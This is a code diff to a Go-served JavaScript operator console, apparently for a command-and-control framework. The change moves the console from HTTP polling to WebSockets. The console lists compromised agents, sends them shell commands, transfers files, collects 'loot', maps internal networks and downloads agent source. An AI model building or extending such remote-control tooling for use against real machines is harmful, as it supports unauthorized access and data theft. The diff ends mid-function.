@@ -14,221 +14,965 @@ func Js(error_str,web_route,web_js,web_css string, sessionSlice []string) http.H
         }
 		if r.Method == http.MethodGet {
 html := `
-const TaskId = Math.random().toString(36).substring(2) + Date.now();
+if (!window.AgentTaskId) {
+    window.AgentTaskId = Math.random().toString(36).substring(2) + Date.now();
+}
+if (!window.main_server) {
+    window.main_server = window.location.host;
+}
+let server_data = [];
+let User_data = [];
+let check_time = [];
+let check_uid = [];
+let shell_list=[];
+let server_plugin = [];
+let chat_slice = [];
+let user_slice = [];
 
-class index{
-    constructor() {
-      this.username = this.getCookie("cookie");
+let msgQueues = {};
+let resultQueues = {};
+let fileQueues = {};
+let netQueues = {};
+
+let resultTimers = window.resultTimers || {};
+window.resultTimers = resultTimers;
+let serverClientCounts = window.serverClientCounts || {};
+window.serverClientCounts = serverClientCounts;
+let onlineTeammates = window.onlineTeammates || [];
+window.onlineTeammates = onlineTeammates;
+window.terminalSessions = window.terminalSessions || {};
+window.netInitTimer = window.netInitTimer || null;
+window.netPollingTimer = window.netPollingTimer || null;
+window.shellInnetData = window.shellInnetData || {};
+
+function createRuntimeTaskId(prefix = "task") {
+    return prefix + "-" + Math.random().toString(36).slice(2) + Date.now();
+}
+
+function normalizeServerCountKey(value) {
+    return String(value || "").trim().toLowerCase();
+}
+
+function escapeHtml(value) {
+    return String(value || "")
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#39;");
+}
+
+function applyServerClientCountsToDom() {
+    if (!Array.isArray(server_data)) {
+        return;
     }
-    getCookie(name) {
-        let cookies = document.cookie.split('; ');
-        for (let i = 0; i < cookies.length; i++) {
-            let cookie = cookies[i];
-            let cookieParts = cookie.split('=');
-            if (cookieParts[0] === name) {
-                return cookieParts[2];
+    server_data.forEach(function(server) {
+        if (!server || typeof server.port === "undefined") {
+            return;
+        }
+        const port = String(server.port);
+        const count = String(serverClientCounts[port] || 0);
+        const clientNode = document.getElementById(port);
+        if (clientNode) {
+            clientNode.textContent = count;
+        }
+    });
+}
+
+function rebuildServerClientCounts(agentList) {
+    const countsByRemark = {};
+    const nextCounts = {};
+    const list = Array.isArray(agentList) ? agentList : [];
+
+    list.forEach(function(agent) {
+        if (!agent) {
+            return;
+        }
+        const key = normalizeServerCountKey(agent.server || agent.Server);
+        if (!key) {
+            return;
+        }
+        countsByRemark[key] = (countsByRemark[key] || 0) + 1;
+    });
+
+    if (Array.isArray(server_data)) {
+        server_data.forEach(function(server) {
+            if (!server || typeof server.port === "undefined") {
+                return;
+            }
+            const port = String(server.port);
+            const remarkKey = normalizeServerCountKey(
+                server.remark || server.Remark || server.server || server.Server
+            );
+            nextCounts[port] = countsByRemark[remarkKey] || 0;
+        });
+    }
+
+    Object.keys(serverClientCounts).forEach(function(port) {
+        delete serverClientCounts[port];
+    });
+    Object.assign(serverClientCounts, nextCounts);
+    applyServerClientCountsToDom();
+}
+
+function applyNetData(uid, list) {
+    if (!uid) {
+        return;
+    }
+    const safeList = Array.isArray(list) ? list : [];
+    netQueues[uid] = safeList;
+
+    window.shellInnetData = window.shellInnetData || {};
+    window.shellInnetData[uid] = safeList.flatMap(function(item) {
+        if (item && Array.isArray(item.shell_innet)) {
+            return item.shell_innet;
+        }
+        return [];
+    }).filter(Boolean);
+
+    const shellSelect = document.getElementById("net_shell");
+    if (shellSelect && shellSelect.value === uid) {
+        let net = new lain_net();
+        net.getshellip(window.shellInnetData[uid], uid);
+        net.renderNetList(safeList, uid);
+    }
+}
+
+
+function getCookie(name) {
+    let cookies = document.cookie.split('; ');
+    for (let i = 0; i < cookies.length; i++) {
+        let cookie = cookies[i];
+        let cookieParts = cookie.split('=');
+        if (cookieParts[0] === name) {
+            return cookieParts[2];
+        }
+    }
+    return null;
+}
+const Username = getCookie("cookie");
+
+class WebSocketClient {
+    constructor(url){
+        this.url = url;
+        this.ws = null;
+        this.currentDownload = null;
+        this.connectPromise = null;
+    }
+    connect(){
+        if(this.ws &&this.ws.readyState === WebSocket.OPEN){
+            return Promise.resolve(true);
+        }
+        if(this.connectPromise){
+            return this.connectPromise;
+        }
+        console.log("connect:",this.url);
+        this.connectPromise = new Promise((resolve, reject)=>{
+            this.ws = new WebSocket(this.url);
+            this.ws.binaryType = "arraybuffer";
+            this.ws.onopen = ()=>{
+                console.log("websocket connected");
+                this.connectPromise = null;
+                resolve(true);
+            };
+            this.ws.onmessage = (event)=>{
+                if(typeof event.data !== "string"){
+                    this.handleBinaryMessage(event.data);
+                    return;
+                }
+                let msg;
+                try{
+                    msg = JSON.parse(event.data);
+                }catch(e){
+                    console.error("json parse error:",event.data);
+                    return;
+                }
+                if(this.handleDownloadMessage(msg)){
+                    return;
+                }
+                this.handleMessage(msg);
+            };
+            this.ws.onerror=(err)=>{
+                console.error("websocket error:",err);
+            };
+            this.ws.onclose=()=>{
+                console.log("websocket closed");
+                this.ws=null;
+                if(this.connectPromise){
+                    reject(new Error("websocket closed before open"));
+                    this.connectPromise = null;
+                }
+            };
+        });
+        return this.connectPromise;
+    }
+    async ensureConnected(timeout = 5000){
+        if(this.ws && this.ws.readyState === WebSocket.OPEN){
+            return true;
+        }
+        const connectPromise = this.connect();
+        if(!connectPromise){
+            return false;
+        }
+        const timeoutPromise = new Promise((_, reject)=>{
+            setTimeout(()=>{
+                reject(new Error("websocket connect timeout"));
+            }, timeout);
+        });
+        await Promise.race([connectPromise, timeoutPromise]);
+        return this.ws && this.ws.readyState === WebSocket.OPEN;
+    }
+    async send(path,body={}){
+        if(!this.ws ||this.ws.readyState !== WebSocket.OPEN){
+            try{
+                await this.ensureConnected();
+            }catch(e){
+                console.error("websocket not connected", e);
+                return false;
             }
         }
-        return null;
+        if(!this.ws ||this.ws.readyState !== WebSocket.OPEN){
+            console.error("websocket not connected");
+            return false;
+        }
+        const data={
+            path:path,
+            body:body
+        };
+        try{
+            this.ws.send(
+                JSON.stringify(data)
+            );
+            console.log("send:",data);
+            return true;
+        }catch(e){
+            console.error("send error:",e);
+            return false;
+        }
     }
-      lainShell(){
-        if (this.username){
-            let interval_server="/`+web_route+`?op=listen&username="+this.username;
-            setInterval(function(){
-                fetch(interval_server)
-                .then(function(response){
-                    return response.json(); // 解析为 JSON
-                })
-                .then(function(clients){
-                    var div = document.getElementById('div_conn');
-                    // 清空旧内容（使用 DOM 操作）
-                    while (div.firstChild) {
-                        div.removeChild(div.firstChild);
-                    }
-
-                    // clients 预期为数组 [{ uid, host, online_time, shell_ip }, ...]
-                    for (var i = 0; i < clients.length; i++) {
-                        var c = clients[i];
-
-                        var container = document.createElement('div');
-                        container.className = 'ip-container';
-                        container.id = 'container-' + c.host;
-
-                        var pUid = document.createElement('p');
-                        pUid.className = 'ip-address';
-                        pUid.id = c.uid;
-                        pUid.textContent = '[Uid:' + c.uid + ']';
-
-                        var pHost = document.createElement('p');
-                        pHost.className = 'shell-address';
-                        pHost.id = c.host;
-                        pHost.textContent = '[Host:' + c.host + ']';
-
-                        var pTime = document.createElement('p');
-                        pTime.className = 'online-time';
-                        pTime.textContent = '[online time:' + c.online_time + ']';
-
-                        var pIP = document.createElement('p');
-                        pIP.className = 'shell-address';
-                        pIP.textContent = '[IP:' + c.shell_ip + ']';
-
-                        var btnReceive = document.createElement('button');
-                        btnReceive.className = 'let-it-in-button';
-                        btnReceive.id = 'button_' + c.host;
-                        btnReceive.textContent = 'receive';
-                        // 用闭包保存当前 uid/host，避免循环引用问题
-                        (function(uid, host){
-                            btnReceive.onclick = function(){
-                                // 调用你现有的函数 get_conn(uid, host)
-                                get_conn(uid, host);
-                            };
-                        })(c.uid, c.host);
-
-                        var btnRemove = document.createElement('button');
-                        btnRemove.className = 'let-it-in-button';
-                        btnRemove.textContent = 'remove';
-                        (function(uid){
-                            btnRemove.onclick = function(){
-                                del_conn(uid);
-                            };
-                        })(c.uid);
-
-                        // 组装
-                        container.appendChild(pUid);
-                        container.appendChild(pHost);
-                        container.appendChild(pTime);
-                        container.appendChild(pIP);
-                        container.appendChild(btnReceive);
-                        container.appendChild(btnRemove);
-
-                        div.appendChild(container);
-                    }
-                })
-                },3500)
+    async sendBinary(data){
+        if(!this.ws || this.ws.readyState !== WebSocket.OPEN){
+            console.error("websocket not connected");
+            return false;
+        }
+        try{
+            this.ws.send(data);
+            return true;
+        }catch(e){
+            console.error("binary send error:",e);
+            return false;
+        }
+    }
+    handleBinaryMessage(data){
+        if(!this.currentDownload){
+            return;
+        }
+        this.currentDownload.chunks.push(data);
+        this.currentDownload.received += data.byteLength || 0;
+    }
+    handleDownloadMessage(msg){
+        if(!this.currentDownload){
+            return false;
+        }
+        if(msg.path !== this.currentDownload.path){
+            return false;
+        }
+        if(msg.code && msg.code !== 200){
+            this.rejectDownload(new Error(msg.message || "download failed"));
+            return true;
+        }
+        const isStart = msg.type === "file_start" ||
+            (msg.filename && typeof msg.size !== "undefined");
+        if(isStart){
+            this.currentDownload.filename = msg.filename || this.currentDownload.filename;
+            this.currentDownload.size = msg.size || 0;
+            this.currentDownload.started = true;
+            return true;
+        }
+        const isEnd = msg.type === "file_end" ||
+            msg.message === "download finished";
+        if(isEnd){
+            this.finishDownload();
+            return true;
+        }
+        return false;
+    }
+    rejectDownload(error){
+        if(!this.currentDownload){
+            return;
+        }
+        const pending = this.currentDownload;
+        if(pending.timer){
+            clearTimeout(pending.timer);
+        }
+        this.currentDownload = null;
+        pending.reject(error);
+    }
+    finishDownload(){
+        if(!this.currentDownload){
+            return;
+        }
+        const pending = this.currentDownload;
+        if(pending.timer){
+            clearTimeout(pending.timer);
+        }
+        const blob = new Blob(
+            pending.chunks,
+            { type: "application/octet-stream" }
+        );
+        const url = URL.createObjectURL(blob);
+        const link = document.createElement("a");
+        link.href = url;
+        link.download = pending.filename || "download.bin";
+        document.body.appendChild(link);
+        link.click();
+        link.remove();
+        setTimeout(()=>{
+            URL.revokeObjectURL(url);
+        }, 1000);
+        this.currentDownload = null;
+        pending.resolve({
+            filename: pending.filename,
+            size: pending.received,
+        });
+    }
+    async downloadFile(path, body = {}, timeout = 30000){
+        if(!this.ws || this.ws.readyState !== WebSocket.OPEN){
+            throw new Error("websocket not connected");
+        }
+        if(this.currentDownload){
+            throw new Error("another download is in progress");
+        }
+        const downloadPromise = new Promise((resolve, reject)=>{
+            this.currentDownload = {
+                path: path,
+                chunks: [],
+                filename: null,
+                size: 0,
+                received: 0,
+                started: false,
+                resolve: resolve,
+                reject: reject,
+                timer: setTimeout(()=>{
+                    this.rejectDownload(new Error("download timeout"));
+                }, timeout),
+            };
+        });
+        const sent = await this.send(path, body);
+        if(!sent){
+            this.rejectDownload(new Error("send download request failed"));
+        }
+        return downloadPromise;
+    }
+    async downloadLog(){
+        return this.downloadFile("downloadlog");
+    }
+    waitForMessage(matcher, timeout = 15000){
+        return new Promise((resolve, reject)=>{
+            if(!this.ws){
+                reject(new Error("websocket not connected"));
+                return;
             }
-      }
-      get(uid,shellname){
-        let confirm1 = confirm('confirm?');
-        if(confirm1){
-            let key_url= "/`+web_route+`?op=insertKey&uid="+uid+"&username="+this.username+"&request="+shellname;
-            fetch(key_url,{
-                credentials: 'include' // 发送 cookie
-            })
-                return uid
+            let timer = null;
+            const listener = (event)=>{
+                let msg;
+                try{
+                    msg = JSON.parse(event.data);
+                }catch(e){
+                    return;
+                }
+                if(!matcher(msg)){
+                    return;
+                }
+                cleanup();
+                resolve(msg);
+            };
+            const cleanup = ()=>{
+                if(timer){
+                    clearTimeout(timer);
+                }
+                if(this.ws){
+                    this.ws.removeEventListener("message", listener);
+                }
+            };
+            timer = setTimeout(()=>{
+                cleanup();
+                reject(new Error("wait message timeout"));
+            }, timeout);
+            this.ws.addEventListener("message", listener);
+        });
+    }
+    async sendFile(path, body, file, chunkSize, onProgress){
+        if(!this.ws || this.ws.readyState !== WebSocket.OPEN){
+            console.error("websocket not connected");
+            throw new Error("websocket not connected");
+        }
+        const readyPromise = this.waitForMessage((msg)=>{
+            return msg.path === path && (msg.type === "ready" || msg.code >= 400);
+        });
+        const requestSent = await this.send(path, body);
+        if(!requestSent){
+            throw new Error("send request failed");
+        }
+        const readyMsg = await readyPromise;
+        if(readyMsg.code && readyMsg.code !== 200){
+            throw new Error(readyMsg.message || "server not ready");
+        }
+        await this.uploadBinary(file, chunkSize, onProgress);
+        const resultPromise = this.waitForMessage((msg)=>{
+            return msg.path === path && msg.type !== "ready";
+        });
+        const endSent = await this.send(
+            "upload_end",
+            {
+                type:"upload_end"
+            }
+        );
+        if(!endSent){
+            throw new Error("send upload_end failed");
+        }
+        const resultMsg = await resultPromise;
+        if(resultMsg.code && resultMsg.code !== 200){
+            throw new Error(resultMsg.message || "upload failed");
+        }
+        return resultMsg;
+    }
+    async uploadChatFile(file, path){
+        return this.sendFile(
+            path,
+            {
+                filename:file.name
+            },
+            file,
+            64 * 1024
+        );
+    }
+    async uploadBinary(file, chunkSize = 64 * 1024, onProgress = null){
+        let offset = 0;
+        while(offset < file.size){
+            let chunk = file.slice(
+                offset,
+                offset + chunkSize
+            );
+            let buffer = await chunk.arrayBuffer();
+            const sent = await this.sendBinary(buffer);
+            if(!sent){
+                throw new Error("binary send failed");
+            }
+            offset += chunkSize;
+            if(onProgress){
+                onProgress(offset, file.size);
+            }
+            console.log("upload:",offset,"/",file.size);
+        }
+    }
+    close(){
+        if(this.ws){
+            this.ws.close();
+            this.ws=null;
+        }
+    }
+    handleMessage(msg) {
+        console.log(
+            "PATH:",msg.path,
+            "received:", msg
+        );
+        switch(msg.path) {
+            case "getResults":
+                if (msg.data && String(msg.data).trim()) {
+                    const shell = (window.terminalSessions && window.terminalSessions[msg.uid]) ||
+                        window.activeTerminal;
+                    if (shell) {
+                        shell.handleResult(msg);
+                    }
+                    console.log("getResults:", msg.data);
+                }
+                break;
+            case "log":
+                this.handleLog(msg);
+                break;
+            case "listen":
+                this.handleListen(msg);
+                break;
+            case "agentList":
+                this.handleAgentList(msg);
+                break;
+            case "chat":
+                chat_slice = msg.data;
+                this.handleChat(msg);
+                break;
+            case "loot":
+                if(msg.data){
+                    let lootIndex = new lain_index();
+                    lootIndex.loothander(msg.data);
+                }
+                break;
+            case "server":
+                this.handleServer(msg);
+                break;
+            case "PluginList":
+                this.handlePlugin(msg);
+                break;
+            case "CheckTime":
+                this.handleCheck(msg);
+                break;
+            case "checkAgent":
+                this.handleCheckAgent(msg);
+                break;
+            case "onlineteamment":
+                if (msg.code === 200 || msg.data) {
+                    this.handleOnlineTeammates(msg);
+                }
+                break;
+            case "getShellInnet":
+                if (msg.code === 200) {
+                    if (msg.uid) {
+                        window.shellInnetData[msg.uid] = msg.data;
+                    }
+                    const selectedUid = document.getElementById("net_shell") ?
+                        document.getElementById("net_shell").value :
+                        "";
+                    if (selectedUid && (!msg.uid || selectedUid === msg.uid)) {
+                        let netInstance = new lain_net();
+                        netInstance.getshellip(msg.data, selectedUid);
+                    }
+                }
+                break;
+            case "insertKey":
+                if(msg.code === 200){
+                    console.log("Key inserted successfully");
+                } else {
+                    console.log("Failed to insert key: " + msg.message);
+                }
+                break
+            case "insertPlugin":
+                if(msg.code === 200){
+                    customLog(msg.message || "Plugin inserted successfully");
+                } else {
+                    customAlert(msg.message || "Insert plugin failed");
+                }
+                break;
+            case "delPlugin":
+                if(msg.code === 200){
+                    customLog(msg.message || "Plugin deleted successfully");
+                } else {
+                    customAlert(msg.message || "Delete plugin failed");
+                }
+                break;
+            case "agentcode":
+                if(msg.code===200){
+                    let blob=new Blob(
+                        [msg.data],
+                        {
+                            type:"text/plain"
+                        }
+                    );
+                    let a=document.createElement("a");
+                    a.href=URL.createObjectURL(blob);
+                    a.download="agent.go";
+                    a.click();
+                }
+                break;
+            case "sendChat":
+                if (msg.code===200){
+                    document.getElementById("chat_input").value="";
+                }
+                break;
+            case "deleteChat":
+                if(msg.code===200){
+                    customLog("Deleted successfully");
+                }
+                break;
+            case "GetMsgList":
+                if (msg.data) {
+                    let uid = msg.data.uid;
+                    msgQueues[uid] = Array.isArray(msg.data.data) ?
+                        msg.data.data :
+                        [];
+                }
+                break;
+            case "GetMsgPost":
+                if (msg.data) {
+                    let uid = msg.data.uid;
+                    resultQueues[uid] = Array.isArray(msg.data.data) ?
+                        msg.data.data :
+                        [];
+                }
+                break;
+            case "GetMsgCache":
+                if (msg.data) {
+                    let uid = msg.data.uid;
+                    fileQueues[uid] = Array.isArray(msg.data.data) ?
+                        msg.data.data :
+                        [];
+                    if (window.activeFileManager &&
+                        window.activeFileManager.uid === uid) {
+                        window.activeFileManager.history_file(uid);
+                    }
+                }
+                break;
+            case "GetMsgNet":
+                if (msg.data) {
+                    const uid = msg.data.uid;
+                    const list = Array.isArray(msg.data.data) ? msg.data.data : [];
+                    applyNetData(uid, list);
+                }
+                break;
+            case "getNetdata":
+                if (msg.code === 200) {
+                    const shellSelect = document.getElementById("net_shell");
+                    const uid = shellSelect ? shellSelect.value : "";
+                    const list = Array.isArray(msg.data) ? msg.data : [];
+                    applyNetData(uid, list);
+                }
+                break;
+            default:
+                console.log("not handled:", msg.path);
+                break;
+        }
+    }
+    handleLog(msg) {
+        if(!msg.data || !msg.data.length){
+            return;
+        }
+        let logDiv = document.getElementById("log-content");
+        if(!logDiv){
+            console.error("Log content div not found.");
+            return;
+        }
+        let html = "";
+        for(let i = 0; i < msg.data.length; i++) {
+            html += "[" + msg.data[i].time + "] : "+ msg.data[i].message + "<br>";
+        }        
+        logDiv.innerHTML = html;
+    }
+    handleChat(msg){
+        let indexchat = new lain_chat();
+        let chat_div = document.getElementById("chat_div");
+        chat_div.innerHTML = "";
+        if (!msg || !Array.isArray(msg.data)) {
+            console.error("Invalid chat data");
+            return;
+        }
+        for (let i = 0; i < msg.data.length; i++) {
+            indexchat.renderChatItem(msg.data[i]);
+        }
+    }
+    handleListen(msg) {
+        let indexInstance = new index();
+        indexInstance.renderClients(msg.data);
+    }
+    handleAgentList(msg) {
+        let indexInstance = new lain_index();
+        if(msg.data && msg.data.length) {
+            User_data = Array.isArray(msg.data) ? msg.data : [];
+            shell_list = User_data.slice();
+            window.shell_list = shell_list;
+            indexInstance.renderUserList(msg.data);
+            net_init();
+            rebuildServerClientCounts(User_data);
+        } else {
+            User_data = [];
+            shell_list = [];
+            window.shell_list = shell_list;
+            net_init();
+            rebuildServerClientCounts(User_data);
+        }
+    }
+    handleServer(msg){
+        let indexServer = new lain_server();
+        server_data = msg.data;
+        indexServer.updateServerIndex();
+        indexServer.initServerIndexClickHandler();
+        rebuildServerClientCounts(User_data);
+        indexServer.requestOnlineTeammates();
+    }
+    handlePlugin(msg){
+        server_plugin = Array.isArray(msg.data) ? msg.data : [];
+        let serverUi = new lain_server();
+        serverUi.refreshPluginList();
+    }
+    handleCheck(msg){
+        check_time = msg.data;
+        let indexCheck = new lain_index();
+        indexCheck.checkTime();
+
+    }
+    handleCheckAgent(msg){
+        let indexCheckAgent = new lain_server();
+        indexCheckAgent.checkAgent(User_data);
+    }
+    handleOnlineTeammates(msg){
+        onlineTeammates = Array.isArray(msg.data) ? msg.data : [];
+        window.onlineTeammates = onlineTeammates;
+        let serverUi = new lain_server();
+        serverUi.renderOnlineTeammatesCard();
+    }
+}
+
+const webSocketClient = new WebSocketClient(
+    "wss://" + main_server + "/"+"`+web_route+`"
+);
+
+webSocketClient.connect();
+
+class index{
+    renderClients(clients){
+        if (typeof clients === "string") {
+            try {
+                clients = JSON.parse(clients);
+            } catch (e) {
+                console.error("Invalid JSON data", e);
+                return;
+            }
+        }
+        var div = document.getElementById('div_conn');
+        // 先清空当前显示
+        while(div.firstChild){
+            div.removeChild(div.firstChild);
+        }
+        // 空数组直接显示为空
+        if (!clients || !Array.isArray(clients)) {
+            console.error("Invalid clients data");
+            return;
+        }
+        if (clients.length === 0) {
+            shell_list = [];
+            net_init();
+            return;
+        }
+        shell_list = Array.isArray(clients) ? clients.slice() : [];
+        window.shell_list = shell_list;
+        net_init();
+        for(let i = 0; i < clients.length; i++){
+            let c = clients[i];
+        
+            var container = document.createElement('div');
+            container.className = 'client-card';
+        
+            var pUid = document.createElement('p');
+			pUid.innerHTML = '<span>Uid</span>' + c.uid;
+
+			var pHost = document.createElement('p');
+			pHost.innerHTML = '<span>Host</span>' + c.host;
+
+			var pTime = document.createElement('p');
+			pTime.innerHTML = '<span>Online</span>' + c.online_time;
+
+			var pIP = document.createElement('p');
+			pIP.innerHTML = '<span>IP</span>' + c.shell_ip;
+        
+            var btnReceive = document.createElement('button');
+            btnReceive.textContent = "Receive";
+            btnReceive.className = "btn receive";
+            btnReceive.onclick = () => {
+                get_conn(c.uid, c.host);
+            };
+        
+            var btnRemove = document.createElement('button');
+            btnRemove.textContent = "Remove";
+            btnRemove.className = "btn remove";
+            btnRemove.onclick = () => {
+                del_conn(c.uid);
+            };
+        
+        
+            var btnBox = document.createElement('div');
+            btnBox.className = "btn-box";
+        
+            btnBox.appendChild(btnReceive);
+            btnBox.appendChild(btnRemove);
+        
+        
+            container.appendChild(pUid);
+            container.appendChild(pHost);
+            container.appendChild(pTime);
+            container.appendChild(pIP);
+            container.appendChild(btnBox);
+        
+            div.appendChild(container);
+        }
+    }
+        get(uid,shellname){
+            let confirm1=customConfirm("confirm?");
+            if(confirm1){
+                webSocketClient.send(
+                    "insertKey",
+                    {
+                        uid:uid,
+                        username:Username,
+                        request:shellname
+                    }
+                );
+                return uid;
             }
         }
         del(uid){
-            let right = confirm('confirm?');
-            let ms = confirm('ok');
-            if (right && ms){
-                document.getElementById("container-"+uid)?.remove();
-                fetch("/`+web_route+`?op=delIndex&uid="+uid)
-                .then(response=>response.text())
-                .then(data=>{
-                })
+            let right=customConfirm("confirm?");
+            let ms=customConfirm("ok");
+            if(right && ms){
+                document
+                .getElementById("container-"+uid)
+                ?.remove();
+                webSocketClient.send(
+                    
+                    "delIndex",
+                    {
+                        uid:uid
+                    }
+                );
             }
         }
-      }
+    }
       
       class lain_terminal{
         constructor() {
             this.uid = "";
-            this.username=this.getCookie("cookie");
-            // this.results=document.getElementById('results').innerHTML;
-            // document.getElementById('shellname').innerText=this.shellname;
-            this.shell_dir = '';
             this.isMovingFile = false;
             this.move_file = this.move_file.bind(this);
             this.look_file = this.look_file.bind(this);
             this.intervalId = null;
             this.currentInput="";
             this.inputContainer="";
+            this.terminalEl = null;
+            this.dialogEl = null;
+            this.currentTaskId = "";
             this.inputKeydown = this.inputKeydown.bind(this);
         }
-
-        init() {
-            if (!this.uid) {
+        lain_time(uid, taskid, command) {
+            if (!uid) {
                 console.log("uid is empty");
-                return;
+                return false;
             }
-            fetch("/`+web_route+`?op=getCurrentDir&uid=" + this.uid)
-                .then(response => response.text())
-                .then(data => {
-                    this.shell_dir = data;
-                    console.log(this.shell_dir);
-                });
-        }
-
-        getCookie(name) {
-            let cookies = document.cookie.split('; ');
-            for (let i = 0; i < cookies.length; i++) {
-                let cookie = cookies[i];
-                let cookieParts = cookie.split('=');
-                if (cookieParts[0] === name) {
-                    return cookieParts[2];
+            try {
+                let key = uid + "*" + taskid;
+                // 防止重复启动
+                if(resultTimers[key]){
+                    console.log("已经在获取");
+                    return false;
                 }
-            }
-            return null;
-        }      
-        async lain_time() {
-            if (this.uid) {
-                let interval_server ="/`+web_route+`?op=getResults&uid="+this.uid+"&Taskid="+TaskId;
-                let self = this;
-                if (this.intervalId) {
-                    clearInterval(this.intervalId);
-                }
-                return new Promise((resolve, reject) => {
-                    this.intervalId = setInterval(async function () {
-                        try {
-                            let response = await fetch(interval_server, {
-                                method: 'GET',
-                            });
-                            let data = await response.text();
-                            if (data) {
-                                const output = document.createElement('div');
-                                output.contentEditable = true;
-                                output.textContent = data;
-                                output.className = 'output';
-                                const inputContainer = terminal.querySelector('.input-container');
-                                inputContainer.appendChild(output);
-                                terminal.scrollTop = terminal.scrollHeight;
-                                clearInterval(self.intervalId);
-                                self.intervalId = null;
-                                resolve(true);
-                            }
-                        } catch (error) {
-                            console.error('Error:', error);
-                            reject(false);
-                        }
-                    }, 1000);
-                });
-            } else {
-                console.log('uid为空');
+                resultTimers[key] = setInterval(()=>{
+                    webSocketClient.send(
+                        "getResults",
+                        {
+                            uid: uid,
+                            Taskid: taskid
+                        },
+                        taskid
+                    );
+                },2000);
+                this.appendOutput("sending msg >>" + command);
+                return true;
+            } catch(err) {
+                console.error("Error:",err);
                 return false;
             }
         }
-        async get(command){
-            if(this.uid){
-                this.sendjob('agent'); // 创建新的提示符
-                let url = "/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(command)+"&Taskid="+TaskId;
-                await fetch(url,{
-                    credentials: 'include' // 发送 cookie
-                });
-                let flag = await this.lain_time();
-                if (flag) {
-                    this.createInput();
+        appendOutput(text, className = "output") {
+            const terminalEl = this.terminalEl ||
+                (this.dialogEl ? this.dialogEl.querySelector(".terminal") : document.querySelector(".terminal"));
+            const inputContainer = this.inputContainer || (terminalEl ? terminalEl.querySelector(".input-container") : null);
+            if (!terminalEl || !inputContainer) {
+                return null;
+            }
+            const output = document.createElement("div");
+            output.contentEditable = true;
+            output.textContent = text;
+            output.className = className;
+            inputContainer.appendChild(output);
+            terminalEl.scrollTop = terminalEl.scrollHeight;
+            return output;
+        }
+        stopGetResults(uid,taskid){
+            let key = uid+"*"+taskid;
+            if(resultTimers[key]){
+                clearInterval(resultTimers[key]);
+                delete resultTimers[key];
+                console.log("stop result",taskid);
+            }
+        }
+        stopAllResultsForUid(uid){
+            if(!uid){
+                return;
+            }
+            const prefix = uid + "*";
+            Object.keys(resultTimers).forEach((key) => {
+                if (key.indexOf(prefix) !== 0) {
+                    return;
                 }
+                clearInterval(resultTimers[key]);
+                delete resultTimers[key];
+            });
+            console.log("stop all results", uid);
+        }
+        handleResult(msg) {
+            const taskid = msg.taskid || this.currentTaskId || AgentTaskId;
+            this.stopGetResults(msg.uid, taskid);
+            this.appendOutput(msg.data);
+            if (this.currentInput) {
+                this.currentInput.focus();
+            }
+        }
+        async get(command){
+            if(!this.uid){
+                return;
+            }
+            this.sendjob('agent'); // 创建新的提示符
+            try {
+                const taskid = createRuntimeTaskId("terminal");
+                let result = await webSocketClient.send(
+                    
+                    "msg",
+                    {
+                        uid:this.uid,
+                        msg:command,
+                        Taskid:taskid
+                    }
+                );
+                if(result){
+                    this.currentTaskId = taskid;
+                    if (this.currentInput) {
+                        this.currentInput.disabled = true;
+                        this.currentInput.readOnly = true;
+                        this.currentInput.classList.add("shell-input-history");
+                    }
+                    this.createInput();
+                    const started = this.lain_time(this.uid, taskid, command);
+                    if (!started) {
+                        this.appendOutput("task polling not started");
+                    }
+                }
+            } catch(err){
+                console.error(err);
+                if (this.currentInput) {
+                    this.currentInput.disabled = false;
+                }
+                this.createInput();
             }
         }
         async sendjob(str){
             const newPrompt = document.createElement('div');
             newPrompt.className = 'output';
             newPrompt.textContent = str+' SendMsg--->>';
-            const terminal = document.getElementById("terminal");
-            const inputContainer = terminal.querySelector(".input-container");
+            const terminal = this.terminalEl ||
+                (this.dialogEl ? this.dialogEl.querySelector(".terminal") : null);
+            const inputContainer = this.inputContainer ||
+                (terminal ? terminal.querySelector(".input-container") : null);
+            if (!terminal || !inputContainer) {
+                return;
+            }
             inputContainer.appendChild(newPrompt);
+            terminal.scrollTop = terminal.scrollHeight;
         }
         createInput() {
+            if (
+                this.currentInput &&
+                !this.currentInput.disabled &&
+                this.currentInput.isConnected
+            ) {
+                this.currentInput.focus();
+                return;
+            }
             const newPrompt = document.createElement('div');
             newPrompt.className = 'output';
             newPrompt.textContent = 'Command>';
@@ -236,10 +980,6 @@ class index{
             newInput.type = 'text';
             newInput.className = 'shell-input';
             newInput.addEventListener('keydown', this.inputKeydown);
-            // 清空旧输入框（如果有）
-            if (this.currentInput && this.currentInput.value !== undefined) {
-                this.currentInput.value = '';
-            }
             this.inputContainer.appendChild(newPrompt);
             this.inputContainer.appendChild(newInput);
             newInput.focus();
@@ -255,29 +995,47 @@ class index{
                 }
             }
         }
-        async loadFile(file_name,fileSize){
-            if(fileSize && file_name){
-                var splitSizeInput = document.getElementById('splitSize');
-                var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
-                let file_key =  this.uid + "**///**" + file_name + "**///**" + splitSize
-                var powershell = "LOAD_U_FILE*//*"+file_key;
-                fetch("/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell)+"&Taskid="+TaskId)
-                .then(response => response.text())
-                .then()
-                return true;
+        async loadFile(file_name, fileSize){
+            if(!fileSize || !file_name){
+                return false;
             }
+            let splitSizeInput = document.getElementById('splitSize');
+            let splitSize = splitSizeInput.value
+                ? parseFloat(splitSizeInput.value) * 1024 * 1024
+                : 0;
+            let file_key = this.uid + "**///**" + file_name + "**///**" + splitSize;
+            let powershell = "LOAD_U_FILE*//*" + file_key;
+            webSocketClient.send(
+                
+                "msg",
+                {
+                    uid:this.uid,
+                    msg:powershell,
+                    Taskid:AgentTaskId
+                }
+            );
+            return true;
         }
         async getFile(path){
-            if(path){
-                var splitSizeInput = document.getElementById('splitSize');
-                var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
-                var powershell = "GET_U_FILE*//*" + path + "*//*" + splitSize;
-                fetch("/`+web_route+`?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(powershell)+"&Taskid="+TaskId)
-                .then(response => response.text())
-                .then();
+            if(!path){
+                return;
             }
+            let splitSizeInput = document.getElementById('splitSize');
+            let splitSize = splitSizeInput.value
+                ? parseFloat(splitSizeInput.value) * 1024 * 1024
+                : 0;
+            let powershell = "GET_U_FILE*//*" + path + "*//*" + splitSize;
